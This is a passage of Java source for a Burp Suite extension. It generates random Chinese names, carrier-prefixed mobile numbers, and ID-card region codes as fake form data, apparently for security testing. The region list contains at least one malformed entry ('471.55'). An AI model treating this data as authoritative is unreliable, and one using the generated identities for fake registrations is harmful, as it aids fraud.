                rkl_jp.setRightComponent(rkl_jp2);//添加在右面
                rkl_jp.setDividerLocation(500);//设置分割的大小

                // customize our UI components
                callbacks.customizeUiComponent(tabs);

                // add the custom tab to Burp's UI
                callbacks.addSuiteTab(BurpExtender.this);

                // register ourselves as an HTTP listener
                callbacks.registerHttpListener(BurpExtender.this);

            }
        });
    }


    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
    }

    @Override
    public String getTabCaption()
    {
        return "xia Liao";
    }

    @Override
    public Component getUiComponent() {
        return tabs;
    }

    //姓名
    private String data0_end(){

        String[] surname  = { "赵", "钱", "孙", "李", "周", "吴", "郑", "王", "冯", "陈",  "杨", "朱",
                "许", "何", "吕", "施", "张",  "谢", "邹", "章", "范", "韦", "方", "唐","贺","黄","宋", "郭","徐"};

        String[] word = { "一", "乙", "二", "十", "丁", "厂", "七", "卜", "人", "入", "八", "九", "几", "儿", "了", "力", "乃", "刀", "又",
                "三", "于", "干", "亏", "士", "工", "土", "才", "寸", "下", "大", "丈", "与", "万", "上", "小", "口", "巾", "山", "千", "乞",
                "川", "亿", "个", "勺", "久", "凡", "及", "夕", "丸", "么", "广", "亡", "门", "义", "之", "尸", "弓", "己", "已", "子", "卫",
                "也", "女", "飞", "刃", "习", "叉", "马", "乡", "丰", "王", "井", "开", "夫", "天", "无", "元", "专", "云", "扎", "艺", "木",
                "五", "支", "厅", "不", "太", "犬", "区", "历", "尤", "友", "匹", "车", "巨", "牙", "屯", "比", "互", "切", "瓦", "止", "少",
                "找", "批", "扯", "址", "走", "抄", "坝", "贡", "攻", "赤", "折", "抓", "扮", "抢", "孝", "均", "抛", "投", "坟", "抗", "坑",
                "坊", "抖", "护", "壳", "志", "扭", "块", "声", "把", "报", "却", "劫", "芽", "花", "芹", "芬", "苍", "芳", "严", "芦", "劳",
                "克", "苏", "杆", "杠", "杜", "材", "村", "杏", "极", "李", "杨", "求", "更", "束", "豆", "两", "丽", "医", "辰", "励", "否",
                "还", "歼", "来", "连", "步", "坚", "旱", "盯", "呈", "时", "吴", "助", "县", "里", "呆", "园", "旷", "围", "呀", "吨", "足",
                "邮", "男", "困", "吵", "串", "员", "听", "吩", "吹", "呜", "吧", "吼", "别", "岗", "帐", "财", "针", "钉", "告", "我", "乱",
                "利", "秃", "秀", "私", "每", "兵", "估", "体", "何", "但", "伸", "作", "伯", "伶", "佣", "低", "你", "住", "位", "伴", "身",
                "皂", "佛", "近", "彻", "役", "返", "余", "希", "坐", "谷", "妥", "含", "邻", "岔", "肝", "肚", "肠", "龟", "免", "狂", "犹",
                "角", "删", "条", "卵", "岛", "迎", "饭", "饮", "系", "言", "冻", "状", "亩", "况", "床", "库", "疗", "应", "冷", "这", "序",
                "注", "泻", "泳", "泥", "沸", "波", "泼", "泽", "治", "怖", "性", "怕", "怜", "怪", "学", "宝", "宗", "定", "宜", "审", "宙",
                "咱", "响", "哈", "咬", "咳", "哪", "炭", "峡", "罚", "贱", "贴", "骨", "钞", "钟", "钢", "钥", "钩", "卸", "缸", "拜", "看",
                "矩", "怎", "牲", "选", "适", "秒", "香", "种", "秋", "科", "重", "复", "竿", "段", "便", "俩", "贷", "顺", "修", "保", "促",
                "畜", "阅", "羞", "瓶", "拳", "粉", "料", "益", "兼"};

        String name;//名字
        Random rd = new Random();
        int index = rd.nextInt(surname.length);
        String surnames = surname[index];//随机 姓

        int temp = rd.nextInt(2)+2;//随机名字2位或者3位
        if(temp == 3) {
            name = surnames+word[rd.nextInt(word.length)]+word[rd.nextInt(word.length)];
        }else {
            name = surnames+word[rd.nextInt(word.length)];
        }
        jta.setText(jta.getText()+"\n"+name);
        return name;
    }

    //手机号
    private String data1_end(){
        String phone;
        //中国移动
        String[] CHINA_MOBILE = {"134", "135", "136", "137", "138", "139", "150", "151", "152", "157", "158", "159","182", "183", "184", "187", "188", "178", "147", "172", "198"};
        //中国联通
        String[] CHINA_UNICOM = {"130", "131", "132", "145", "155", "156", "166", "171", "175", "176", "185", "186", "166"};
        //中国电信
        String[] CHINA_TELECOME = {"133", "149", "153", "173", "177", "180", "181", "189", "199"};

        Random rd = new Random();

        //生成手机号后8位
        String phone_8="";
        for (int i = 0; i < 8; i++) {
            phone_8 = phone_8+rd.nextInt(10);
        }
        int op = rd.nextInt(3);
        switch (op) {
            case 0:
                phone  = CHINA_MOBILE[rd.nextInt(CHINA_MOBILE.length)]+phone_8;
                jta.setText(jta.getText()+"\n中国移动:"+phone);
                return phone;
            case 1:
                phone =CHINA_UNICOM[rd.nextInt(CHINA_UNICOM.length)]+phone_8;
                jta.setText(jta.getText()+"\n中国联通:"+phone);
                return phone;
            case 2:
                phone =CHINA_TELECOME[rd.nextInt(CHINA_TELECOME.length)]+phone_8;
                jta.setText(jta.getText()+"\n中国电信:"+phone);
                return phone;
            default:
                return "13800138000";
        }
    }

    //身份证
    private String data2_end(){

        String sfz;

        String[] sfz_list={"451381|合山市","542336|聂拉木县","320902|亭湖区","321324|泗洪县","210900|阜新","511132|峨边彝族自治县","320682|如皋市","222400|延边州","411023|许昌县","420922|大悟县","511324|仪陇县","320982|大丰市","542300|日喀则市","140881|永济市","542429|巴青县","632700|玉树州","370982|新泰市","341000|黄山市","130433|馆陶县","211324|喀左县","130700|张家口","150428|喀喇沁旗","230422|绥滨县","330303|龙湾区","331002|椒江区","231002|东安区","350203|思明区","659002|阿拉尔市","320804|淮阴区","320411|新北区","141102|离石区","450404|龙圩区","341523|舒城县","130922|青县","210503|溪湖区","350105|马尾区","620924|阿克塞县","421222|通城县","330226|宁海县","620802|崆峒区","320203|南长区","451227|巴马县","532600|文山州","440600|佛山市","530400|玉溪","371402|德城区","522731|惠水县","621021|庆城县","500119|南川区","152502|锡林浩特市","320402|天宁区","370781|青州市","410800|焦作","340721|铜陵县","620503|麦积区","610402|秦都区","231200|绥化","231085|穆棱市","331100|丽水","140922|五台县","440982|化州市","320602|崇川区","130625|徐水区","140221|阳高县","220500|通化市","230223|依安县","451322|象州县","321281|兴化市","360803|青原区","410802|解放区","640402|原州区","211422|建昌县","341800|宣城市","341122|来安县","430502|双清区","320508|姑苏区","542323|江孜县","431125|江永县","330104|江干区","440184|从化区","340303|蚌山区","130123|正定县","370983|肥城市","371581|临清市","441200|肇庆市","141030|大宁县","130302|海港区","370100|济南","131026|文安县","130823|平泉县","511800|雅安","371302|兰山区","532929|云龙县","330703|金东区","430321|湘潭县","621226|礼县","230382|密山市","510812|朝天区","371122|莒县","622921|临夏县","520203|六枝特区","150525|奈曼旗","511381|阆中市","421381|广水市","211011|太子河区","211202|银州区","370304|博山区","500223|潼南区","130703|桥西区","150105|赛罕区","130322|昌黎县","421121|团风县","511423|洪雅县","430524|隆回县","522301|兴义市","420203|西塞山区","341323|灵璧县","542622|工布江达县","542226|曲松县","511323|蓬安县","140926|静乐县","130404|复兴区","530622|巧家县","320600|南通","421003|荆州区","440607|三水区","230716|上甘岭","530800|普洱","230804|前进区","230900|七台河","150303|海南区","610424|乾县","130828|围场县","620921|金塔县","330700|金华","420322|郧西县","610702|汉台区","330302|鹿城区","610431|武功县","620402|白银区","532528|元阳县","511322|营山县","220503|二道江区","430702|武陵区","130727|阳原县","620423|景泰县","370402|市中区","530827|孟连县","632223|海晏县","230300|鸡西","610581|韩城市","451224|东兰县","440523|南澳县","632822|都兰县","210922|彰武县","350322|仙游县","360922|万载县","140581|高平市","350925|周宁县","370404|峄城区","140729|灵石县","411282|灵宝市","440106|天河区","411200|三门峡","361124|铅山县","230307|麻山区","450681|东兴市","230112|阿城区","341021|歙县","321000|扬州","320826|涟水县","210103|沈河区","632121|平安区","230403|工农区","130702|桥东区","520421|平坝区","621228|两当县","210782|北镇市","410212|祥符区","611000|商洛市","500226|荣昌区","330803|衢江区","622925|和政县","230111|呼兰区","422825|宣恩县","532930|洱源县","130127|高邑县","513401|西昌市","511421|仁寿县","511723|开江县","513336|乡城县","510522|合江县","410000|河南","623025|玛曲县","130303|山海关区","320583|昆山市","652300|昌吉州","360429|湖口县","210603|振兴区","430422|衡南县","150121|土默特左旗","440204|浈江区","331023|天台县","430304|岳塘区","140200|大同","230229|克山县","320829|洪泽县","341322|萧县","621000|庆阳","420000|湖北","520201|钟山区","150204|青山区","542428|班戈县","640381|青铜峡市","421024|江陵县","130000|河北","451026|那坡县","610527|白水县","640000|宁夏","532628|富宁县","430525|洞口县","520326|务川县","150783|扎兰屯市","360000|江西","542335|吉隆县","152523|苏尼特左旗","421223|崇阳县","320114|雨花台区","440608|高明区","130902|新华区","430703|鼎城区","360727|龙南县","321323|泗阳县","522327|册亨县","522634|雷山县","340300|蚌埠市","411702|驿城区","371325|费县","611025|镇安县","370303|张店区","230302|鸡冠区","610330|凤县","370000|山东","371000|威海","150927|察哈尔右翼中旗","341721|东至县","410323|新安县","370305|临淄区","411721|西平县","510824|苍溪县","431382|涟源市","340702|铜官山区","410204|鼓楼区","370214|城阳区","110228|密云县","440783|开平市","230407|兴山区","140107|杏花岭区","440308|盐田区","230100|哈尔滨","510112|龙泉驿区","131123|武强县","230184|五常市","210404|望花区","469032|南沙群岛","130200|唐山市","532624|麻栗坡县","542523|噶尔县","450300|桂林","140181|古交市","450800|贵港","510504|龙马潭区","131126|故城县","542621|林芝县","110107|石景山区","211403|龙港区","331004|路桥区","411330|桐柏县","320115|江宁区","211421|绥中县","320830|盱眙县","130108|裕华区","130705|宣化区","430822|桑植县","451022|田东县","440282|南雄市","341222|太和县","210422|新宾满族自治县","440511|金平区","421300|随州市","140822|万荣县","440304|福田区","120221|宁河区","410326|汝阳县","511826|芦山县","520329|余庆县","610426|永寿县","513422|木里县","211004|宏伟区","441821|佛冈县","411625|郸城县","370302|淄川区","440781|台山市","510703|涪城区","361128|鄱阳县","430603|云溪区","610423|泾阳县","150702|海拉尔区","320102|玄武区","210311|千山区","411426|夏邑县","500238|巫溪县","450311|雁山区","420704|鄂城区","511526|珙县","610300|宝鸡市","410422|叶县","340311|淮上区","140623|右玉县","510300|自贡","130821|承德县","140224|灵丘县","410927|台前县","350212|同安区","130131|平山县","152528|镶黄旗","542527|措勤县","520181|清镇市","510411|仁和区","350124|闽清县","130582|沙河市","440923|电白区","370828|金乡县","330182|建德市","411522|光山县","500105|江北区","330204|江东区","440804|坡头区","330000|浙江省","610427|彬县","360300|萍乡","110111|房山区","211122|盘山县","130981|泊头市","331022|三门县","150522|科尔沁左翼后旗","360105|湾里区","610116|长安区","410403|卫东区","230602|萨尔图区","150122|托克托县","610625|志丹县","341723|青阳县","440222|始兴县","530723|华坪县","513435|甘洛县","341321|砀山县","520221|水城县","410581|林州市","520603|万山区","320800|淮安","500108|南岸区","330782|义乌市","632824|冷湖行委","440200|韶关市","620825|庄浪县","421224|通山县","150426|翁牛特旗","451223|凤山县","510122|双流县","410621|浚县","220821|镇赉县","130400|邯郸","510781|江油市","530921|凤庆县","150800|巴彦淖尔","330206|北仑区","130983|黄骅市","340406|潘集区","140227|大同县","500113|巴南区","513224|松潘县","542333|仲巴县","131003|广阳区","330424|海盐县","420204|下陆区","331121|青田县","542427|索县","222404|珲春市","130223|滦县","321003|邗江区","440103|荔湾区","450105|江南区","341102|琅琊区","410505|殷都区","530328|沾益县","410600|鹤壁","130283|迁安市","532526|弥勒市","110000|北京","371326|平邑县","230882|富锦市","210213|金州区","110116|怀柔区","130125|行唐县","330211|镇海区","632802|德令哈市","141022|翼城县","130535|临西县","445222|揭西县","141027|浮山县","450127|横县","130635|蠡县","130921|沧县","513423|盐源县","511525|高县","130406|峰峰矿区","150221|土默特右旗","510106|金牛区","430412|南岳区","542227|措美县","411621|扶沟县","210203|西岗区","710000|台湾","441581|陆丰市","522725|瓮安县","410882|沁阳市","210600|丹东","630122|湟中县","140827|垣曲县","530621|鲁甸县","410803|中站区","451323|武宣县","610102|新城区","440400|珠海市","350430|建宁县","410304|瀍河区","542132|洛隆县","522324|晴隆县","370322|高青县","620302|金川区","520627|沿河县","232722|塔河县","533324|贡山县","350725|政和县","533123|盈江县","500109|北碚区","411526|潢川县","532331|禄丰县","370900|泰安","450203|鱼峰区","320721|赣榆区","451023|平果县","542337|萨嘎县","331125|云和县","441825|连山县","451024|德保县","370611|福山区","420702|梁子湖区","211300|朝阳","331126|庆元县","610925|岚皋县","220521|通化县","511025|资中县","512081|简阳市","530700|丽江","341300|宿州市","371423|庆云县","632200|海北州","441400|梅州市","340811|宜秀区","640121|永宁县","350921|霞浦县","430500|邵阳","150202|东河区","522730|龙里县","371524|东阿县","360281|乐平市","632126|互助土族自治县","120103|河西区","431129|江华县","360721|赣县","230231|拜泉县","230505|四方台区","150624|鄂托克旗","620602|凉州区","140602|朔城区","150102|新城区","131125|安平县","530428|元江县","610425|礼泉县","431121|祁阳县","340403|田家庵区","360482|共青城市","652800|巴音郭楞州","430111|雨花区","540100|拉萨","513225|九寨沟","230281|讷河市","210111|苏家屯区","530122|晋宁县","320404|钟楼区","510132|新津县","621227|徽县","511524|长宁县","530422|澄江县","371424|临邑县","623024|迭部县","350623|漳浦县","140524|陵川县","330212|鄞州区","632625|久治县","500229|城口县","361021|南城县","431300|娄底","371328|蒙阴县","360802|吉州区","330402|南湖区","513227|小金县","140828|夏县","231084|宁安市","370784|安丘市","421302|曾都区","360104|青云谱区","510115|温江区","431229|靖州县","441427|蕉岭县","130623|涞水县","532627|广南县","141002|尧都区","430922|桃江县","320105|建邺区","420923|云梦县","320321|丰县","522322|兴仁县","150502|科尔沁区","130224|滦南县","370811|任城区","510105|青羊区","450226|三江县","430923|安化县","450125|上林县","220283|舒兰市","361181|德兴市","310105|长宁区","371728|东明县","450703|钦北区","230205|昂昂溪区","210411|顺城区","350924|寿宁县","431228|芷江县","530523|龙陵县","620826|静宁县","210381|海城市","513323|丹巴县","350500|泉州","130184|新乐市","150902|集宁区","341700|池州市","530524|昌宁县","341126|凤阳县","542129|芒康县","210700|锦州","232721|呼玛县","370181|章丘市","321203|高港区","411602|川汇区","542627|朗县","330502|吴兴区","330683|嵊州市","510113|青白江区","141182|汾阳市","360981|丰城市","350926|柘荣县","360600|鹰潭","430602|岳阳楼区","141026|安泽县","320500|苏州","542331|康马县","640422|西吉县","610000|陕西","230623|林甸县","422827|来凤县","632621|玛沁县","610825|定边县","640181|灵武市","530502|隆阳区","370124|平阴县","610902|汉滨区","350502|鲤城区","230207|碾子山区","360202|昌江区","650204|白碱滩区","140725|寿阳县","420804|掇刀区","445221|揭东区","370321|桓台县","230708|美溪区","360825|永丰县","430821|慈利县","511823|汉源县","220681|临江市","150103|回民区","410404|石龙区","530721|玉龙县","440281|乐昌市","530626|绥江县","659003|图木舒克市","652900|阿克苏地区","341023|黟县","510129|大邑县","340102|瑶海区","420700|鄂州市","410211|金明区","140928|五寨县","511724|大竹县","610827|米脂县","410700|新乡","500114|黔江区","632222|祁连县","330282|慈溪市","330921|岱山县","130430|邱县","610103|碑林区","511403|彭山区","152921|阿拉善左旗","371121|五莲县","441882|连州市","370826|微山县","451302|兴宾区","361125|横峰县","610122|蓝田县","230522|友谊县","510683|绵竹市","130928|吴桥县","520400|安顺","533300|怒江州","350900|宁德","532301|楚雄市","210505|南芬区","411626|淮阳县","532927|巍山县","150104|玉泉区","522729|长顺县","451102|八步区","542224|桑日县","340123|肥西县","610526|蒲城县","610829|吴堡县","141121|文水县","430104|岳麓区","440900|茂名市","140724|昔阳县","542524|日土县","360622|余江县","130132|元氏县","510104|锦江区","610628|富县","330800|衢州","500234|开县","340823|枞阳县","220605|江源区","210283|庄河市","230125|宾县","220602|浑江区","511321|南部县","522702|福泉市","370704|坊子区","341525|霍山县","410500|安阳","130229|玉田县","230110|香坊区","130534|清河县","653100|喀什地区","320581|常熟市","530923|永德县","530825|镇沅县","152531|多伦县","513335|巴塘县","410185|登封市","360521|分宜县","120111|西青区","341600|亳州市","350982|福鼎市","230506|宝山区","370212|崂山区","350425|大田县","360722|信丰县","610632|黄陵县","320211|滨湖区","370503|河口区","450922|陆川县","230707|新青区","542338|岗巴县","320400|常州","422800|恩施州","211121|大洼县","469033|中沙群岛的岛礁及其海域","610900|安康市","530802|思茅区","513233|红原县","141128|方山县","530121|呈贡区","230230|克东县","411425|虞城县","340103|庐阳区","140123|娄烦县","211382|凌源市","440300|深圳市","371521|阳谷县","542623|米林县","370523|广饶县","810000|深水埗区","210104|大东区","632128|循化撒拉族自治县","340104|蜀山区","530127|嵩明县","500236|奉节县","620523|甘谷县","450330|平乐县","350104|仓山区","140225|浑源县","542329|白朗县","210711|太和区","411329|新野县","429005|潜江市","441323|惠东县","620421|靖远县","542625|波密县","310115|浦东新区","469030|琼中县","152222|科尔沁右翼中旗","370285|莱西市","330481|海宁市","421221|嘉鱼县","533422|德钦县","150802|临河区","140702|榆次区","513426|会东县","440981|高州市","230225|甘南县","510682|什邡市","420100|武汉市","232723|漠河县","231283|海伦市","522728|罗甸县","130633|易县","140781|介休市","450312|临桂区","510304|大安区","370281|胶州市","350981|福安市","451002|右江区","621122|陇西县","350526|德化县","350402|梅列区","341881|宁国市","371603|沾化区","411403|睢阳区","371721|曹县","620121|永登县","450000|广西","140932|偏关县","430726|石门县","310108|闸北区","360782|南康区","340700|铜陵市","530926|耿马县","622923|永靖县","610728|镇巴县","140424|屯留县","510000|四川","130432|广平县","340503|花山区","510723|盐亭县","130103|桥东区","350724|松溪县","230102|道里区","341602|谯城区","340122|肥东县","533323|福贡县","130429|永年县","330900|舟山","450881|桂平市","410922|清丰县","632821|乌兰县","410523|汤阴县","220422|东辽县","620321|永昌县","522727|平塘县","130627|唐县","640122|贺兰县","320900|盐城","140728|平遥县","411104|召陵区","140721|榆社县","632800|海西州","361100|上饶","533122|梁河县","450403|万秀区","431028|安仁县","441702|江城区","542325|萨迦县","340800|安庆市","511402|东坡区","320705|新浦区","420600|襄阳市","320925|建湖县","140826|绛县","450325|兴安县","530321|马龙县","511827|宝兴县","542222|扎囊县","433125|保靖县","350525|永春县","450602|港口区","533103|芒市","131024|香河县","610328|千阳县","510182|彭州市","532822|勐海县","230705|西林区","520103|云岩区","632624|达日县","410104|管城回族区","440704|江海区","621025|正宁县","370300|淄博","320923|阜宁县","131182|深州市","232702|松岭区","361126|弋阳县","450324|全州县","341324|泗县","371600|滨州","420503|伍家岗区","440404|金湾区","610327|陇县","510722|三台县","341022|休宁县","620724|高台县","410724|获嘉县","430528|新宁县","230800|佳木斯","654200|塔城地区","542125|丁青县","341502|金安区","511129|沐川县","422801|恩施市","370902|泰山区","320303|云龙区","430102|芙蓉区","220421|东丰县","350822|永定区","310230|崇明县","150725|陈巴尔虎旗","445100|潮州市","230713|带岭区","513427|宁南县","650103|沙依巴克区","510821|旺苍县","140122|阳曲县","431124|道县","420202|黄石港区","533124|陇川县","230204|铁锋区","420300|十堰市","433123|凤凰县","110106|丰台区","530113|东川区","410727|封丘县","130824|滦平县","140930|河曲县","370681|龙口市","350703|建阳区","511802|雨城区","542121|卡若区","411729|新蔡县","511821|名山区","130632|安新县","370282|即墨市","632127|化隆回族自治县","331181|龙泉市","430981|沅江市","110105|朝阳区","361102|信州区","610624|安塞县","510704|游仙区","522628|锦屏县","130133|赵县","451200|河池","360102|东湖区","513331|白玉县","500115|长寿区","140624|怀仁县","410184|新郑市","220581|梅河口市","150222|固阳县","210905|清河门区","430181|浏阳市","220582|集安市","532823|勐腊县","371724|巨野县","632723|称多县","350902|蕉城区","542600|林芝","532502|开远市","360122|新建区","530821|宁洱县","340826|宿松县","130304|北戴河区","370521|垦利县","310114|嘉定区","230200|齐齐哈尔","430725|桃源县","131025|大城县","640104|兴庆区","520621|江口县","371400|德州","310118|青浦区","522326|望谟县","530126|石林彝族自治县","360502|渝水区","411281|义马市","510108|成华区","445303|云安区","371422|宁津县","640423|隆德县","141129|中阳县","232703|新林区","421321|随县","410305|涧西区","420982|安陆市","220722|长岭县","421123|罗田县","431123|双牌县","211282|开原市","350421|明溪县","330521|德清县","350723|光泽县","140931|保德县","610500|渭南市","451031|隆林县","350622|云霄县","610114|阎良区","220822|通榆县","230113|双城区","150821|五原县","371323|沂水县","371723|成武县","520222|盘县","210911|细河区","231282|肇东市","433127|永顺县","511922|南江县","410503|北关区","430302|雨湖区","510626|罗江县","211102|双台子区","320507|相城区","220402|龙山区","211302|双塔区","441226|德庆县","511523|江安县","441823|阳山县","130900|沧州","540123|尼木县","610721|南郑县","230208|梅里斯达斡尔族区","620721|肃南县","410202|龙亭区","140303|矿区","140431|沁源县","542100|昌都市","350824|武平县","360700|赣州","620300|金昌","331081|温岭市","520200|六盘水","140900|忻州","451221|南丹县","623000|甘南州","450702|钦南区","130203|路北区","131023|永清县","232700|大兴安岭","520402|西秀区","620621|民勤县","361029|东乡县","542327|昂仁县","310112|闵行区","350627|南靖县","520113|白云区","431127|蓝山县","210604|振安区","621023|华池县","341024|祁门县","440111|白云区","150785|根河市","231225|明水县","140400|长治","370921|宁阳县","511123|犍为县","440205|曲江区","513230|壤塘县","321102|京口区","542326|拉孜县","450600|防城港","440803|霞山区","469031|西沙群岛","130638|雄县","231100|黑河","210402|新抚区","370602|芝罘区","431024|嘉禾县","330326|平阳县","441827|清新县","520302|红花岗区","120112|津南区","360427|星子县","130524|柏乡县","320202|崇安区","360111|青山湖区","152923|额济纳旗","411381|邓州市","511781|万源市","420526|兴山县","370600|烟台","350524|安溪县","360823|峡江县","610927|镇坪县","429006|天门市","610200|铜川市","320505|虎丘区","510321|荣县","530900|临沧","341204|颍泉区","350581|石狮市","411600|周口","450329|资源县","410603|山城区","341522|霍邱县","370830|汶上县","370684|蓬莱市","510400|攀枝花","360203|珠山区","430621|岳阳县","210400|抚顺","430624|湘阴县","340504|雨山区","410106|上街区","411422|睢县","520123|修文县","533325|兰坪县","152900|阿拉善盟","220323|伊通满族自治县","370700|潍坊","500121|璧山区","420881|钟祥市","130600|保定","430112|望城区","410411|湛河区","110114|昌平区","341200|阜阳市","522722|荔波县","440306|宝安区","120116|滨海新区","150302|海勃湾区","500233|忠县","371103|岚山区","211204|清河区","420222|阳新县","370883|邹城市","542233|浪卡子县","622922|康乐县","632626|玛多县","431224|溆浦县","422828|鹤峰县","211100|盘锦","441800|清远市","430406|雁峰区","630121|大通县","450503|银海区","130825|隆化县","630100|西宁市","440507|龙湖区","532801|景洪市","220221|永吉县","430200|株洲","350211|集美区","370306|周村区","532626|丘北县","431321|双峰县","431128|新田县","610126|高陵区","430529|城步苗族自治县","230902|新兴区","610629|洛川县","542232|错那县","640400|固原市","469001|五指山市","230621|肇州县","140921|定襄县","341100|滁州市","431227|新晃县","130634|曲阳县","140109|万柏林区","130281|遵化市","445224|惠来县","511722|宣汉县","131181|冀州市","341422|无为县","370634|长岛县","330327|苍南县","511725|渠县","130522|临城县","511622|武胜县","150782|牙克石市","441500|汕尾市","500243|彭水县","341003|黄山区","411528|息县","441424|五华县","610125|户县","150304|乌达区","440513|潮阳区","330602|越城区","371502|东昌府区","321081|仪征市","230503|岭东区","360428|都昌县","520526|威宁县","370103|市中区","230606|大同区","513231|阿坝县","430224|茶陵县","530100|昆明","341802|宣州区","623026|碌曲县","232704|呼中区","441300|惠州市","411728|遂平县","451402|江州区","131082|三河市","361025|乐安县","141033|蒲县","410402|新华区","371481|乐陵市","620200|嘉峪关","430521|邵东县","130629|容城县","542128|左贡县","230605|红岗区","431223|辰溪县","500118|永川区","610929|白河县","371329|临沭县","360124|进贤县","532328|元谋县","421127|黄梅县","211000|辽阳","530425|易门县","371621|惠民县","441900|东莞市","530102|五华区","522300|黔西南州","410923|南乐县","430682|临湘市","110109|门头沟区","140000|山西","360702|章贡区","230108|平房区","330205|江北区","420900|孝感市","441224|怀集县","542223|贡嘎县","512002|雁江区","450326|永福县","510603|旌阳区","511111|沙湾区","350423|清流县","210421|抚顺县","520622|玉屏县","630103|城中区","420822|沙洋县","469005|文昌市","610928|旬阳县","130531|广宗县","522600|黔东南州","430781|津市市","440903|茂港区","430000|湖南","411000|许昌市","542328|谢通门县","430921|南县","520424|关岭县","120225|蓟县","421281|赤壁市","340621|濉溪县","430400|衡阳","522626|岑巩县","632622|班玛县","211224|昌图县","469024|临高县","530724|宁蒗县","500000|重庆","451027|凌云县","420606|樊城区","430103|天心区","210811|老边区","411202|湖滨区","421122|红安县","520303|汇川区","533102|瑞丽市","410181|巩义市","140622|应县","320000|江苏","654300|阿勒泰地区","421022|公安县","469007|东方市","141082|霍州市","321182|扬中市","542421|那曲县","410704|凤泉区","611024|山阳县","530125|宜良县","130682|定州市","542422|嘉黎县","542332|定结县","350721|顺昌县","450721|灵山县","130431|鸡泽县","542123|贡觉县","513333|色达县","211200|铁岭","140925|宁武县","330624|新昌县","511102|市中区","371482|禹城市","610525|澄城县","610104|莲湖区","230306|城子河区","130804|鹰手营子矿区","513338|得荣县","120223|静海区","350426|尤溪县","310106|静安区","430802|永定区","230603|龙凤区","341202|颍州区","230502|尖山区","140726|太谷县","220403|西安区","510903|船山区","430381|湘乡市","431281|洪江市","520327|凤冈县","632300|黄南州","350600|漳州","130521|邢台县","522633|从江县","610528|富平县","513437|雷波县","411627|太康县","441283|高要区","430281|醴陵市","440113|番禺区","340181|巢湖市","610727|略阳县","652201|哈密市","610113|雁塔区","441302|惠城区","621022|环县","140203|矿区","210502|平山区","222406|和龙市","610722|城固县","542626|察隅县","350200|厦门","513429|布拖县","511923|平昌县","220600|白山市","230803|向阳区","360423|武宁县","530302|麒麟区","610429|旬邑县","522623|施秉县","360881|井冈山市","360103|西湖区","451421|扶绥县","533321|泸水县","621100|定西","410108|惠济区","370686|栖霞市","532623|西畴县","130604|南市区","520330|习水县","220724|扶余市","230224|泰来县","530326|会泽县","410102|中原区","360828|万安县","471.55|宿迁","430421|衡阳县","230833|抚远县","450223|鹿寨县","511303|高坪区","510500|泸州","632600|果洛州","450225|融水县","330300|温州","350300|莆田","370832|梁山县","230921|勃利县","532922|漾濞县","321183|句容市","511100|乐山","450923|博白县","360827|遂川县","610331|太白县","511623|邻水县","440402|香洲区","511124|井研县","370812|兖州区","150581|霍林郭勒市","620900|酒泉","210122|辽中县","511903|恩阳区","420302|茅箭区","610723|洋县","150423|巴林右旗","610831|子洲县","330183|富阳区","230600|大庆","220105|二道区","440203|武江区","370202|市南区","610204|耀州区","632324|河南蒙古族自治县","231182|五大连池市","130723|康保县","420200|黄石市","210202|中山区","110115|大兴区","513334|理塘县","532300|楚雄州","513424|德昌县","510181|都江堰市","532322|双柏县","410526|滑县","130731|涿鹿县","500102|涪陵区","620123|榆中县","130926|肃宁县","150124|清水河县","220802|洮北区","511529|屏山县","320100|南京","211281|调兵山市","370911|岱岳区","130300|秦皇岛","330902|定海区","510124|郫县","411081|禹州市","441523|陆河县","512021|安岳县","430423|衡山县","331122|缙云县","451228|都安县","371200|莱芜","150500|通辽市","450102|兴宁区","445381|罗定市","220881|洮南市","330281|余姚市","530902|临翔区","620981|玉门市","431026|汝城县","210321|台安县","511325|西充县","440700|江门市","640105|西夏区","420117|新洲区","130530|新河县","530325|富源县","542423|比如县","460200|三亚市","131081|霸州市","130183|晋州市","530722|永胜县","520524|织金县","371327|莒南县","520626|德江县","230227|富裕县","510402|东区","210211|甘井子区","620525|张家川回族自治县","371312|河东区","141122|交城县","530124|富民县","431122|东安县","510322|富顺县","510600|德阳","370683|莱州市","620822|灵台县","430800|张家界","532926|南涧县","371403|陵城区","341124|全椒县","150521|科尔沁左翼中旗","230126|巴彦县","632224|刚察县","140821|临猗县","533421|香格里拉市","445281|普宁市","530128|禄劝县","130500|邢台","330122|桐庐县","451400|崇左","130527|南和县","320506|吴中区","632322|尖扎县","510623|中江县","130683|安国市","411622|西华县","530922|云县","431221|中方县","350527|金门县","231102|爱辉区","371622|阳信县","520321|遵义县","450331|荔浦县","370923|东平县","360781|瑞金市","130121|井陉县","610626|吴起县","340711|郊区","340321|怀远县","340827|望江县","360728|定南县","620622|古浪县","411725|确山县","632823|天峻县","513232|若尔盖县","420303|张湾区","513325|雅江县","610326|眉县","511921|通江县","512022|乐至县","141125|柳林县","430225|炎陵县","350521|惠安县","610100|西安市","411722|上蔡县","500101|万州区","540102|城关区","150206|白云鄂博矿区","320703|连云区","210300|鞍山","430700|常德","430681|汨罗市","440515|澄海区","650105|水磨沟区","220400|辽源市","659004|五家渠市","220106|绿园区","431322|新化县","230406|东山区","420106|武昌区","330421|嘉善县","632221|门源回族自治县","500242|酉阳县","451202|金城江区","500231|垫江县","430405|珠晖区","445302|云城区","450900|玉林","130624|阜平县","420902|孝南区","152224|突泉县","210112|浑南区","141034|汾西县","141025|古县","320282|宜兴市","411303|卧龙区","511424|丹棱县","620982|敦煌市","410225|兰考县","441625|东源县","510311|沿滩区","371722|单县","420821|京山县","433100|湘西州","611002|商州区","430105|开福区","510800|广元","520525|纳雍县","520628|松桃县","450803|港南区","420984|汉川市","450521|合浦县","230702|伊春区","532529|红河县","510900|遂宁","360829|安福县","340405|八公山区","421023|监利县","450405|长洲区","450512|铁山港区","410327|宜阳县","410900|濮阳","120115|宝坻区","441225|封开县","150824|乌拉特中旗","411322|方城县","410329|伊川县","350681|龙海市","421100|黄冈市","520323|绥阳县","532500|红河州","420582|当阳市","411327|社旗县","130730|怀来县","510303|贡井区","440224|仁化县","533423|维西傈僳族自治县","220281|蛟河市","130128|深泽县","140700|晋中","320621|海安县","140106|迎泽区","230421|萝北县","440881|廉江市","430611|君山区","230405|兴安区","610523|大荔县","440105|海珠区","231000|牡丹江","441202|端州区","360403|浔阳区","331000|台州","542228|洛扎县","513324|九龙县","422826|咸丰县","211021|辽阳县","440512|濠江区","231221|望奎县","421083|洪湖市","441623|连平县","230703|南岔区","130982|任丘市","511528|兴文县","420625|谷城县","431081|资兴市","330881|江山市","623021|临潭县","370481|滕州市